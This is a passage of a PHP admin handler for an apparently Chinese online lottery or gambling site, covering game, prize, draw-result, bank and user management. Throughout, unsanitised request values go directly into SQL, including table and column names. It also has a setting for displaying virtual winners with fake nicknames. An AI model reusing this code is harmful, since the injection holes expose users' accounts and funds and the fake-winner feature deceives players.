<?php

$id=$_GET['id'];
$active=$_GET['active'];
$nowtime=date("Y-m-d H:i:s",time());

include(ROOT_PATH."/source/function/run.php");

include(ROOT_PATH."/source/function/core.do.fun.php");


if($active=='ssc_list'){
	if($_POST['ckey']){

		$row=$db->fetch_first("select * from game_code where ckey='$_POST[ckey]'");
		$_POST['code']=$row['fullname'];
	}

   $id=$_POST['id'];
	if($id>0){



		add_adminlog( "编辑玩法:".$_POST['fullname']);
	}
	else{
		$db->query("insert into game_ssc_list(`status`) values('0')");

		$id=mysql_insert_id();

		add_adminlog( "添加新玩法".$_POST['fullname']);
	}
	if($id>0){

		foreach ($_POST as $key=> $value) {
		    if($key!='id' && $key!='submit' && $key)
			$db->query("update `game_ssc_list` set `{$key}`='{$value}' where id='{$id}'");
		}
	}
	echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>玩法保存成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";



}

if($active=='ssc_prize'){




		foreach ($_POST['prize'] as $key=> $value) {
			$db->query("update `game_ssc_list` set `prize`='{$value}' where id='{$key}'");
		}

    foreach ($_POST['max_select'] as $key=> $value) {
        $db->query("update `game_ssc_list` set `max_select`='{$value}' where id='{$key}'");
    }
		add_adminlog( "更新时时彩玩法奖金和最大投注");
	echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>奖金更新成功</font></div>";
echo "<script>window.location='".$_SERVER['HTTP_REFERER']."';</script>";
//echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";



}


if($active=="system"){
	if(count($_FILES)>0){

	include_once '../source/function/Image.php';
	$img=new Image();
	$path="/data/uploads/system/";
	foreach ($_FILES as $key=>$value) {
		if($file=$img->up_image($_FILES[$key], "../".$path)){
		$_POST[$key]=$ico=$path.$file;

	}
	}


	}
	$bank='';
	if($_POST['bank']){
	foreach ($_POST['bank'] as $value) {
		if($bank=='')$bank=$value;
		else $bank.="|".$value;
	}

$_POST['bank']=$bank;
	}

	$ssc_system='';
	if($_POST['ssc_system']){
	foreach ($_POST['ssc_system'] as $value) {
		if($ssc_system=='')$ssc_system=$value;
		else $ssc_system.="|".$value;
	}

$_POST['ssc_system']=$ssc_system;
	}

		$active_fee_bank='';
	if($_POST['active_fee_bank']){
	foreach ($_POST['active_fee_bank'] as $value) {
		if($active_fee_bank=='')$active_fee_bank=$value;
		else $active_fee_bank.="|".$value;
	}

$_POST['active_fee_bank']=$active_fee_bank;
	}


	if($_POST['cash_type']){
	foreach ($_POST['cash_type'] as $value) {
		if($cash_type=='')$cash_type=$value;
		else $cash_type.="|".$value;
	}

$_POST['cash_type']=$cash_type;

	}



	if($_POST['game_qw']==2){

		$row=$db->fetch_all("select * from game_type where firstcode like '%QW%'");
		if(count($row)>0){

			foreach ($row as $value) {

		    $code=explode("|", $value['code']);
            $str=$code[0].'|0';
		     $db->query("update game_type set firstcode='{$str}' where id='{$value['id']}'");

			}


		}


	}


add_adminlog( "修改系统设置");
echo "<script type='text/javascript' src='/js/common.js'></script>";

$db->query("set names utf8;");
foreach ($_POST as $key=> $value) {
    if($key=='recharge_type')
        $value=serialize($value);
if($db->fetch_first("select * from sys where `key`='{$key}'")){
	$db->query("update sys set `value`='{$value}' where `key`='{$key}'");

}
else {

	$db->query("insert into sys(`key`,`value`) values('{$key}','{$value}')");
}
}





echo "<script>alert('保存成功');window.location='".$_SERVER['HTTP_REFERER']."';</script>";

}


if($active=="prize_top"){
$status=$_POST['status'];
$top_max_num=$_POST['top_max_num'];
$top_max_money=$_POST['top_max_money'];
$top_limit_time=$_POST['top_limit_time'];
$is_open_virtual=$_POST['is_open_virtual'];
$top_vir_min=$_POST['top_vir_min'];
$top_vir_max=$_POST['top_vir_max'];
$top_vir_game=$_POST['top_vir_game'];
$top_vir_nick=$_POST['top_vir_nick'];
for($i=0;$i<count($top_vir_game);$i++){
if($top_vir_game_s==""){$top_vir_game_s=$top_vir_game[$i];}else{$top_vir_game_s.="|".$top_vir_game[$i];}
}


echo "<script type='text/javascript' src='/js/common.js'></script>";
if(!$status and !$top_max_num and !$top_max_money and !$top_limit_time and !$is_open_virtual and !$top_vir_min and !$top_vir_max and !$top_vir_game and !$top_vir_nick){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>所有内容必填</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}else{
$db->query("set names utf8;");
$strSql="update prize_top set status='$status',top_max_num='$top_max_num',top_max_money='$top_max_money',top_limit_time='$top_limit_time',is_open_virtual='$is_open_virtual',top_vir_min='$top_vir_min',top_vir_max='$top_vir_max',top_vir_game='$top_vir_game_s',top_vir_nick='$top_vir_nick' where id='1'";
$db->query($strSql);
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>保存成功</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
exit;
}
if($active=="game_type"){


$fullname=$_POST['fullname'];
$ckey=$_POST['ckey'];


$status=$_POST['status'];
$first_cate=$_POST['firstcode'];
if(!$_POST['show_index'])$_POST['show_index']=0;
if(!$_POST['show_nav'])$_POST['show_nav']=0;
if(!$_POST['show_nav2'])$_POST['show_nav2']=0;
if(!$_POST['icon1'])$_POST['icon1']=0;
if(!$_POST['icon2'])$_POST['icon2']=0;
if($_FILES['lot_ico']  ){

	include_once '../source/function/Image.php';
	$img=new Image();
	$path="data/uploads/ico/";
	if($file=$img->up_image($_FILES['lot_ico'], "../".$path)){
		$_POST['ico']=$ico=$path.$file;

	}

}

$modeslist="";
$modes=explode("|", $_POST['code']);
for ($i=0;$i<count($modes);$i++){
if($modeslist==""){$modeslist=$modes[$i];}else{$modeslist=$modeslist."|".$modes[$i];}
if($first_cate==$modes[$i]){$this_code_num=$i;$is_inarray="yes";}
}

foreach ($modes as $value) {
	$modeslist_arr=explode("|", $modeslist);

	$list1=$db->fetch_all("select * from game_code where pid in (select id from  game_code where ckey='{$value}') order by sortnum asc, id asc");
	if($list1){
	foreach ($list1 as $value1) {
		if(!in_array($value1['ckey'], $modeslist_arr)) $modeslist=$modeslist."|".$value1['ckey'];

	}
	}
}

$_POST['code']=$modeslist;
echo "<script type='text/javascript' src='/static/js/common.js'></script>";
if($is_inarray=="yes"){$first_cate.="|".$this_code_num;}else{
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>“玩法选择”中所勾上的玩法应该包含“默认玩法”中所选择的玩法</font></div>";
echo "<script>setTimeout(\"history.back()\",3000)</script>";
}
$_POST['firstcode']=$first_cate;
if($fullname==""or $ckey==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>所有内容必填</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit;
}else{
if($id==""){
$db->query("set names utf8;");
$strSql="insert into game_type(fullname,ckey,code,status,`ico`) value ('$fullname','$ckey','$code','0','$ico')";
$db->query($strSql) or die("插入时出错".mysql_error());
$id=mysql_insert_id();
if($id>0){

	add_adminlog( "添加新彩种:".$fullname);
}
else{
		echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>添加失败</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit;


}

}else{
$db->query("set names utf8;");
if($ico) $str=" ,`ico`='{$ico}'";

$strSql="update game_type set fullname='$fullname',ckey='$ckey',code='$modeslist',status='$status' {$str} where id='$id'";


$db->query($strSql) or die("插入时出错1".mysql_error());
add_adminlog( "修改彩种信息:".$fullname);
}

$code_list=explode('|', $modeslist);



foreach ($code_list as $value) {
		$row11=$db->fetch_all("select * from game_code_list where CodeKey='{$value}'");
		$temp=array();
		if(count($row11)){
			foreach ($row11 as $value1) {
			$temp[]=$value1['ListKey'];
			}

			$wanfa[$value]=$temp;
		}
}

$_POST['wanfa']=serialize($wanfa);

if($id>0){
unset($_POST['modes']);
	foreach ($_POST as $key=> $value) {

	    if($key!='id')
		$db->query("update game_type set `$key`='{$value}' where id='{$id}'");
	}

}

Arr_File::ArrGames();
Arr_File::ArrCodes();
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>保存成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
}



if($active=="lotTime"){


$playkey=$_POST['playkey'];
$flag=$_POST['flag'];
$floatid=$_POST['id'];
$begintime=$_POST['begintime'];
$endtime=($_POST['endtime']);
$lotTime=($_POST['lotTime']);
$lotNum=$_POST['lotNum'];
if($flag=="save"){
for($i=0;$i<count($begintime);$i++){
$num_new=htmlspecialchars($lotNum[$i]);
$begin_new=htmlspecialchars($begintime[$i]);
$end_new=htmlspecialchars($endtime[$i]);
$lot_new=htmlspecialchars($lotTime[$i]);
$id_new=htmlspecialchars($floatid[$i]);

$strSql="update game_time set lotNum='$num_new',beginTime='$begin_new',endTime='$end_new',lotTime='$lot_new' where id='$id_new'";

$db->query($strSql);
add_adminlog( "修改开奖时间");
}
}else{
for($i=0;$i<count($begintime);$i++){
$num_new=htmlspecialchars($lotNum[$i]);
$begin_new=htmlspecialchars($begintime[$i]);
$end_new=htmlspecialchars($endtime[$i]);
$lot_new=htmlspecialchars($lotTime[$i]);
$id_new=htmlspecialchars($floatid[$i]);
$db->query("set names utf8;");
$strSql="insert into game_time(playKey,lotNum,beginTime,endTime,lotTime) value ('$playkey','$num_new','$begin_new','$end_new','$lot_new')";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
add_adminlog( "添加开奖时间");
}
}
Arr_File::ArrGameTime();
echo "<script type='text/javascript' src='../style/js/common.js'></script>";
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>保存成功</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}



if($active=="gameCode"){
$fullname=$_POST['fullname'];
$ckey=$_POST['ckey'];
$cate=$_POST['cate'];
$type=$_POST['type'];
$pid=$_POST['pid'];
$status=$_POST['status'];
echo "<script type='text/javascript' src='/style/js/common.js'></script>";
if($fullname==""or $ckey==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>所有内容必填</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
}else{
if($id==""){
$db->query("set names utf8;");
$strSql="insert into game_code(fullname,ckey,type,pid,status,sortnum) value ('$fullname','$ckey','$type','$pid','$status','{$_POST['sortnum']}')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
add_adminlog("添加新玩法：{$fullname}");
}else{
$db->query("set names utf8;");
$strSql="update game_code set fullname='$fullname',ckey='$ckey',type='$type',pid='$pid',status='$status',sortnum='{$_POST['sortnum']}' where id='$id'";
$db->query($strSql);
add_adminlog( "修改玩法：{$fullname}");
}
Arr_File::ArrCodes();
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>保存成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
}


if($active=="game_time"){
$title=$_POST['title'];
$begintime=$_POST['begintime'];
$code=$_POST['code'];
$endtime=$_POST['endtime'];
if($title==""or $begintime==""or $endtime==""or $code==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您还未填写相关内容或未获取到关键字，请重试！</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}else{
if($id==""){
$db->query("set names utf8;");
$strSql="insert into game_time(title,begintime,code,endtime) value ('$title','$begintime','$code','$endtime')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
add_adminlog( "添加开奖时间");
}else{
$db->query("set names utf8;");
$strSql="update game_time set title='$title',begintime='$begintime',endtime='$endtime' where id='$id'";
$db->query($strSql);

add_adminlog( "修改开奖时间");
}
Arr_File::ArrGameTime();
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
exit;
}


if($active=="game_IntFace"){
$playkey=$_POST['playkey'];
$links=$_POST['links'];
$Level=$_POST['Level'];
$status=$_POST['status'];
if($links==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您还未填写相关内容</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}else{
if($id==""){
$db->query("set names utf8;");
$strSql="insert into game_IntFace(playkey,links,Level,status) value ('$playkey','$links','$Level','$status')";
$db->query($strSql) or die("插入时出错2".mysql_error());
add_adminlog("添加开奖接口");
}else{
$db->query("set names utf8;");
$strSql="update game_IntFace set playkey='$playkey',links='$links',Level='$Level',status='$status' where id='$id'";
$db->query($strSql) or die("插入时出错1".mysql_error());
add_adminlog("修改开奖接口");
}
	update_kaijiang();
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
exit;
}
if($active=='admin_pwd'){


		if(!$_POST['password']){
		echo "<script>alert('旧登录密码不能为空');window.history.go(-1); </script>";
		exit();
	}
	if(!$_POST['ps1']){
		echo "<script>alert('新登录密码不能为空');window.history.go(-1); </script>";
		exit();
	}
	if($_POST['ps1']!=$_POST['ps2']){
		echo "<script>alert('两次输入登录密码不一致');window.history.go(-1); </script>";
		exit();
	}
	$userinfo=$db->fetch_first("select * from user where userid='{$_SESSION['admin_id']}'");
	if(get_md5($_POST['password'], $userinfo['salt'])!=$userinfo['password']){
	echo "<script>alert('原始登录密码输入不正确');window.history.go(-1); </script>";
		exit();
	}
	else{

		$pwd=$_POST['ps1'];
		md5_pwd($_SESSION['admin_id'],$pwd);
	add_adminlog("修改登陆密码");
			echo "<script>alert('登录密码修改成功');</script>";

echo "<script>window.location='".$_SERVER['HTTP_REFERER']."';</script>";
exit();
	}




}


if($active=='admin'){



if($id>0){

	foreach ($_POST  as $key =>$value) {
		if($key!='password')
		$db->query("update `user` set `$key`='{$value}' where userid='{$id}'");
	}
	add_adminlog( "修改管理员{$_POST['username']}信息");
}
	else{
		$username=$_POST['username'];
	$query=$db->query("select * from user where username='$username' and admin='1'");
	if(mysql_fetch_array($query)){
		echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您填写的用户名已经存在</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit();

	}

		$db->query("insert into user(`admin`,`registertime`) values('1',now())");

		if(mysql_affected_rows()>0){

			$id=mysql_insert_id();


			foreach ($_POST  as $key =>$value) {
		if($key!='password')
		$db->query("update `user` set `$key`='{$value}' where userid='{$id}'");
	}
	add_adminlog( "添加新管理员：{$_POST['username']}");
		}
	}
if($_POST['password'] and $id>0 ) md5_pwd($id,$_POST['password'] );


if($_POST['status']!='1')$db->query("delete from login_error where username='{$_POST['username']}'");
	if($_GET['from']=='admin'){
	echo "<script>alert('保存成功');</script>";

echo "<script>window.location='".$_SERVER['HTTP_REFERER']."';</script>";


	}
	else{
	echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";

	}

}



if($active=="user"){


$password=$_POST['password'];
$bank_pass=$_POST['bank_pass'];
$sex=$_POST['sex'];
$isproxy=$_POST['isproxy'];
$proxynum=$_POST['proxynum'];
$mobilephone=$_POST['mobilephone'];
$qqnum=$_POST['qqnum'];
$rebate=$_POST['rebate'];
    $virtual =$_POST['virtual'];
if(!$isproxy) $isproxy=0;
if($password!=""){$pass=" ,password=md5('$password')";}else{$pass="";}


if($_POST['pname']){

	$high=$db->fetch_first("select * from user where username='{$_POST['pname']}' and isproxy='0' ");
	if($high){
		if($id==$high['userid']){
		echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='color:#ff0000;'>上级代理不能填写自己</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit();


		}
		else {
$higherid=$high['userid'];
$pre=$db->fetch_first("select * from user where userid='{$higherid}'");
if($_POST['rebate']>$pre['rebate']){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='color:#ff0000;'>返点不能大于上级代理的返点【{$pre['rebate']}%】</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit();
}


		}

	}
	else{


echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您填写的上级代理不存在</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit();

	}

}


if($id>0){
$strSql="update user set sex='$sex',tranfer='{$_POST['tranfer']}',status='$_POST[status]',modes='$modes',higherid='{$higherid}',isproxy='$isproxy',proxynum='$proxynum',mark='$_POST[mark]',fenhong='$_POST[fenhong]',ps_pre1='$_POST[ps_pre1]',ps_pre2='$_POST[ps_pre2]' $pass where userid='$id'";

add_adminlog( "修改用户{$_POST['username']}信息");
}
else{
	$username=$_POST['username'];
	$query=$db->query("select * from user where username='$username'");
	if(mysql_fetch_array($query)){
		echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您填写的用户名已经存在</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit();

	}
	$strSql="insert into user(username,password,modes,tranfer,higherid,role,sex,isproxy,proxynum,`status`,registertime,fenhong,mark,ps_pre1,ps_pre2) values('$username','".md5($password)."','{$modes}','{$_POST[tranfer]}','$higherid','$role','$sex','$isproxy','$proxynum','$_POST[status]',now(),'{$_POST[fenhong]}','$_POST[mark]' ,'$_POST[ps_pre1]','$_POST[ps_pre2]')";

	add_adminlog( "添加新用户:{$username}");
}
$db->query($strSql);

if(!$id){
$id=$uid=$db->insert_id();
if($uid>0)	{
    $db->query("insert into user_bank(userid,status) values('$uid','{$_POST['bank']['status']}' )");

}
}

if($id){

  if($_POST['extral']){

        foreach ($_POST['extral'] as $key=>$value){

            $db->query("update user set `{$key}`='{$value}' where userid='{$id}'");

        }

    }

    $user1=get_user_info($id);
      $group=$db->exec("select * from user_group where id='{$user1['groupid']}'");

    if($group['sys']!=1){
        $group=$db->exec("select * from user_group where score<='{$_POST['extral']['score']}' and sys='0' order by score desc limit 0,1");

        $db->query ( "update user set `groupid`='{$group['id']}' where userid='{$id}'" );


    }


   $rebates=serialize($_POST['rebates']);
 $db->query("update user set `rebates`='{$rebates}' where userid='{$id}'");




	if($bank_pass!=''){
$strSql="update user_bank set password=md5('$bank_pass') where userid='$id'";
$db->query($strSql);
	}

    if($_POST['bank']){

        foreach ($_POST['bank'] as $key=>$value){

            $db->query("update user_bank set `{$key}`='{$value}' where userid='{$id}'");

        }

    }


$db->query($strSql);

echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
;
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";


}
else{

echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>操作失败</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";


}

exit;
}


if($active=="lottery_hand"){
$code=$_POST['code'];
$list_id=$_POST['list_id'];
$periods=trim($_POST['period']);
$lott_num=trim($_POST['lott_num']);
$SerialDates=trim($_POST['SerialDate']);
if($id==""){
if($code==""or $list_id==""or $lott_num==""or $SerialDates==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您还未填写相关内容</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit;
}
}
if($periods-1<0){$period="";}else{$period=$periods;}
$floatnum=trim($SerialDates).trim($period);
if($id==""){
$db->query("set names utf8;");
$strSql="insert into game_lottery(code,playKey,SerialID,SerialDate,period,Number,LotTime,status) value ('$code','$list_id','$period','$SerialDates','$floatnum','$lott_num','$nowtime','0')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
add_adminlog( "插入开奖数据");
}else{
$db->query("set names utf8;");
$strSql="update game_lottery set Number='$lott_num' where id='$id'";
$db->query($strSql);
add_adminlog( "修改开奖数据");
}
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
exit;
}

//推荐组合

if($active=="jie_kou"){
$code=$_POST['code'];
$list_id=$_POST['list_id'];
$periods=trim($_POST['period']);
$lott_num=trim($_POST['lott_num']);
$SerialDates=trim($_POST['SerialDate']);
$fn_id=trim($_POST['fn_id']);
if($id==""){
if($code==""or $list_id==""or $lott_num==""or $SerialDates==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>您还未填写相关内容</font></div>";
echo "<script>setTimeout(\"history.back()\",1000)</script>";
exit;
}
}
if($periods-1<0){$period="";}else{$period=$periods;}
$floatnum=trim($SerialDates).trim($period);
if($id==""){
$db->query("set names utf8;");
$strSql="insert into jie_kou(sheng_fen,start_qi,day,nr,N_from,fn_id) value ('$list_id','$period','$SerialDates','$lott_num','进行中','$fn_id')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
}else{
$db->query("set names utf8;");
$strSql="update jie_kou set nr='$lott_num' where id='$id'";
$db->query($strSql);
}
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
exit;
}


if($active=="system_bank"){
$bankname=$_POST['bankname'];
$bank_branch=$_POST['bank_branch'];
$banknum=$_POST['banknum'];
$realname=$_POST['realname'];
$email=$_POST['email'];
$loadmin=$_POST['loadmin'];
$loadmax=$_POST['loadmax'];
if($banknum==""or $realname==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>帐号及帐户名为必填！</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}else{
$db->query("set names utf8;");
$strSql="insert into system_bank(bankname,bank_branch,banknum,realname,email,loadmin,loadmax,status) value ('$bankname','$bank_branch','$banknum','$realname','$email','$loadmin','$loadmax','0')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
exit;
}
if($active=="system_bank_list"){
$status=$_POST['status'];
$SortNum=$_POST['SortNum'];
$images=$_POST['images'];
$bankurl=$_POST['bankurl'];
$isAuto=$_POST['isAuto'];
$floatid=$_POST['id'];
for($i=0;$i<count($floatid);$i++){
$status_new=htmlspecialchars($status[$i]);
$SortNum_new=htmlspecialchars($SortNum[$i]);
$images_new=htmlspecialchars($images[$i]);
$bankurl_new=htmlspecialchars($bankurl[$i]);
$id_new=htmlspecialchars($floatid[$i]);
$isAuto_new=htmlspecialchars($isAuto[$i]);
$strSql="update system_bank_list set status='$status_new',isAuto='$isAuto_new',SortNum='$SortNum_new',images='$images_new',bankurl='$bankurl_new' where id='$id_new'";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
}
echo "<script type='text/javascript' src='../js/common.js'></script>";
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>保存成功</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
}
if($active=="SetManager"){
$perid=$_GET['perid'];
$keys=$_GET['keys'];
if($keys=="add"){$itemvalue="6";}else{$itemvalue="0";}
$db->query("set names utf8;");
$strSql="update user set role='$itemvalue' where userid='$perid'";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
echo "yes";
}
if($active=="CodeList"){
$codekey=$_POST['codekey'];
$ids=$_POST['list_id'];
$listname=$_POST['listname'];
$titles=$_POST['titles'];
$list_key=explode("|",$ids);
$list_name=explode("|",$listname);
$db->query("set names utf8;");
for($i=0;$i<count($list_key);$i++){
$strSql="insert into game_code_list(CodeKey,ListKey,ShowTile,CodeTile,OrderS,status) value ('$codekey','$list_key[$i]','$list_name[$i]','$titles','0','0')";
$db->query($strSql);
Arr_File::ArrCodes();
}
echo "yes";
}
if($active=="CodeListShow"){
$codekey=$_GET['codekey'];
$db->query("set names utf8;");
$sqls="select * from game_code_list where CodeKey='$codekey' order by OrderS asc";
$results=$db->query($sqls);
$headerHTML="<table width='100%' border='0' cellpadding='4' cellspacing='1' bgcolor='#CCCCCC' valign=top>";
$headerHTML.=" <tr height=20 bgcolor='#CCCCCC' align=center><td align=center width='15%'>玩法ID</td><td align=center width='15%'>分类名称</td>";
$headerHTML.=" <td width='20%'>玩法名称</td><td width='5%'>排序</td><td width='10%'  style='display:none;'>返点计算</td><td width='10%' style='display:none;' >最大注数</td><td width='20%'>操作</td></tr>";
while($rowslogs=mysql_fetch_array($results)){
$uid=$rowslogs[id];
$bodyHTML.="<tr height=20 bgcolor='#FFFFFF'><td align=center>".$rowslogs[ListKey]."</td>";
$bodyHTML.="<td align=center><input id='CodeTile_".$uid."' value='".$rowslogs[CodeTile]."' size=10></td>";
$bodyHTML.="<td align=center><input id='ShowTile_".$uid."' value='".$rowslogs[ShowTile]."' size=10></td>";
$bodyHTML.="<td align=center><input id='OrderS_".$uid."' value='".$rowslogs[OrderS]."' size=1></td>";
$bodyHTML.="<td align=center  style='display:none;'><select id='Rebate_".$uid."'>";
if($rowslogs[Rebate]=="Second"){$a_s="";$b_s="selected";}else{{$a_s="selected";$b_s="";}}
$bodyHTML.="<option value='Normal' ".$a_s.">正常</option><option value='Second' ".$b_s.">不定位</option>";
$bodyHTML.="</select></td>";
$bodyHTML.="<td align=center style='display:none;'><input id='MaxNote_".$uid."' value='".$rowslogs[MaxNote]."' size=3></td>";
$bodyHTML.="<td align=center><span id='save_".$uid."'><a class='mouse_show link_01' onclick=\"saveCodeList('".$uid."')\">保存</a></span>  <a class='mouse_show link_01' onclick=\"DelCodeList('".$uid."')\">删除</a></td></tr>";
}
if($bodyHTML==""){$bodyHTML="<tr height=40 bgcolor='#FFFFFF'><td align=center colspan=5>未找到</td></tr>";}
$bottomHTML="</table>";
$re_HTML=$headerHTML.$bodyHTML.$bottomHTML;
echo $re_HTML;
}
if($active=="SaveCodeList"){
$uid=$_POST['uid'];
$CodeTile=$_POST['CodeTile'];
$ShowTile=$_POST['ShowTile'];
$OrderS=$_POST['OrderS'];
$Rebate=$_POST['Rebate'];
$MaxNote=$_POST['MaxNote'];
$db->query("set names utf8;");
$strSql="update game_code_list set CodeTile='$CodeTile',ShowTile='$ShowTile',OrderS='$OrderS',Rebate='$Rebate',MaxNote='$MaxNote' where id='$uid'";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
Arr_File::ArrCodes();
echo "yes";
}
if($active=="codemode"){
$uid=$_POST['uid'];
$item=$_POST['item'];
if($item=="close"){$value="fix";}
if($item=="open"){$value="default";}
if($item==""or $uid==""){echo "yes";exit;}
$db->query("set names utf8;");
$strSql="update game_code set mode='$value' where id='$uid'";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
echo "yes";exit;
}
if($active=="saveitem"){
$uid=$_POST['uid'];
$item=$_POST['item'];
$value=$_POST['value'];
$dbname=$_POST['dbname'];
if($item==""or $uid==""){echo "no";exit;}
$db->query("set names utf8;");
$strSql="update $dbname set $item='$value' where id='$uid'";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
echo "yes";exit;
}
if($active=="delete"){
$flags="no";
$deltime=$_POST['deltime'];
$delkey=$_POST['delkey'];
$dbnames=$_POST['dbnames'];
$dbfh="=";
if($delkey=="before"){$dbfh="<";}
if($delkey=="under"){$dbfh=">";}
$db->query("set names utf8;");
$strSql="delete from $dbnames where creatdate $dbfh '$deltime'";
$db->query($strSql);
$flags="yes";
echo $flags;
}

if($active=="t_delete"){
$flags="no";
$deltime=$_POST['deltime'];

$table=$_POST['dbnames'];
$name=$_POST['name'];
$dbfh="=";

if($table=='user_fenhong_log' or $table=='user_fandian_log' or $table=='adminlog' or $table=='user_fenhong' or $table=='userlog' ){
	$key='time';
	$deltime=strtotime($deltime);
}

else if($table=='hemai'){

	$key='addtime';
	$deltime=strtotime($deltime);

}
else if($table=='game_lottery'){

	$key='LotTime';
}
else{
	$key='creatdate';
}
if(strpos($table, "?")!==false){
	$t=explode("?", $table);
	$table=$t[0];

	$tt=explode("=", $t[1]);
	$str=" and `{$tt[0]}`='{$tt[1]}' ";
}
else $str='';

if($table=='game_lottery'){


	$str.=" and playKey!='3D'  and playKey!='PL3' ";
}


$db->query("set names utf8;");
$strSql="delete from $table where {$key}<='{$deltime}' {$str}";
$db->query($strSql);
if($table=='hemai'){

$strSql="delete from hemai_list where {$key}<='{$deltime}' {$str}";
$db->query($strSql);
}


add_adminlog("删除{$name}{$_POST['deltime']}之前的数据");
$flags="yes";
echo $flags;
}
if($active=="AddGameTime"){
